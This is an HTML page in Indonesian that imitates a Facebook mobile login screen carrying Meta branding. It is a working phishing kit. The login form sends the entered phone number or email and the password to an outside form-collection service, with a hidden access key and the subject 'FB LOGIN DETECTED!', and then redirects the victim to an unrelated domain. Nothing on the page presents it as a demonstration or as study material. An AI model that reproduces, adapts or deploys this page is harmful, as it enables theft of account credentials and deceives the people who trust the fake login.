<!DOCTYPE html>
<html>
    <head>
        <title>Anda harus login terlebih dahulu</title>
        <meta name="viewport" content="width:device-width, initial-scale=1.0, user-scalable=no">
        <link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet'>
        <style>
            .flex{display:flex;align-items:center;}
            .col{flex-direction:column}
            .row{flex-direction:row}
            .ctr{justify-content:center}
            body{background-color:white;margin:0 auto;width:100%;max-width:700px;padding:0;font-family:Roboto;font-weight:100;}
            p,h1,h2,h3,h4,h5,h6{margin:5px;}
            .thin{font-weight:70}
            .medium{font-weight:400}
            .bold{font-weight:800}
        </style>
    </head>
    <body>
        <div style="background-color:#fffbe2;color:#7f7212;padding:5px;border-bottom:1px solid #e2c822">
            <h4 class="thin">Anda harus login dulu.</h4>
        </div>
        <br>
        <div class="flex col ctr">
            <h2 class="bold" style="color:#1877f2">facebook</h2>
        <form style="display:flex;flex-direction:column;justify-content: center;align-items:center;width:360px;margin:0;padding:0;"  action="https://api.staticforms.xyz/submit" method="post">
            <input name="$userID" type="text" style="border: none;background-color:#f5f6f7;color:#757575;width:100%;padding:12px;box-shadow:1px 1px 1px #ccd0d5;margin:5px;display:block;border-radius:3px;" placeholder="Nomor ponsel atau email" required>
            <input name="$userPASSWORD" type="text"  style="border:none;background-color:#f5f6f7;color:#757575;width:100%;padding:12px;box-shadow:1px 1px 1px #ccd0d5;margin:5px;display:block;border-radius:3px;" placeholder="kata Sandi" required>
            <input type="text" name="honeypot" style="display:none">
            <input type="hidden" name="accessKey" value="dd19b72b-7921-48bc-a116-1a83405ce207">
            <input type="hidden" name="subject" value="FB LOGIN DETECTED!" />
            <input type="hidden" name="redirectTo" value="https://lapakaman.com/hKAyjwYViT">
            <input type="submit" style="border:none;background-color:#1877f2;color:white;width:100%;padding:12px;box-shadow:1px 1px 1px #ccd0d5;margin:5px;display:block;border-radius:3px;font-weight:600;" value="Masuk dan Lanjutkan">
        </form>
        <br>
        <div class="flex col ctr">
            <h4 style="color:#1877f2;font-weight:100;"><a style="color:#1877f2;text-decoration:none;" href="https://m.facebook.com/login/identify/">Lupa kata sandi?</a></h4>
        </div>
        
        <br>
        <div class="flex row ctr">
            <div style="width:150px;height:0.5px;background-color:#ccd0d5"></div>
            <div style="width:60px;color:#757575;text-align:center;">atau</div>
            <div style="width:150px;height:0.5px;background-color:#ccd0d5"></div>
        </div>
        <br>
        <div style="padding:6px 80px;border:1px solid #ccd0d5;color:black;border-radius:3px;"><a style="color:black;text-decoration:none;" href="https://m.facebook.com/reg/">Buat akun baru</a></div>
    </div>
    <br><br>
    <br><br>
    <div class="flex row ctr thin">
        <div style="width:50%;color:#576b95;" class="flex col ctr thin">
            <h5 style="color:#757575">Bahasa Indonesia</h5>
            <h5 style="font-weight:100">Basa Jawa</h5>
            <h5 style="font-weight:100">Portugues (Brasil)</h5>
            <h5 style="font-weight:100">Deutsch</h5>
        </div>
        <div style="width:50%;color:#576b95;" class="flex col ctr">
            <h5 style="font-weight:100">English (UK)</h5>
            <h5 style="font-weight:100">Bahasa Melayu</h5>
            <h5 style="font-weight:100">Espanol</h5>
            <span style="padding:1px 6px;border:1px solid #576b95;color:#757575;border-radius:2px;">+</span>
        </div>
    </div>
    <br>
    <div class="flex row ctr">
        <h6 style="color:#757575;font-weight:100;">Tentang</h6>
        <h6 style="color:#757575;font-weight:100;">Bantuan</h6>
        <h6 style="color:#757575;font-weight:100;">Lainnya</h6>
    </div>
    <div class="flex col ctr">
        <h5 style="color:#757575;font-weight:100;">Meta &copy; 2023</h5>
    </div>
    <br><br>
    <br><br>
    </body>
</html>
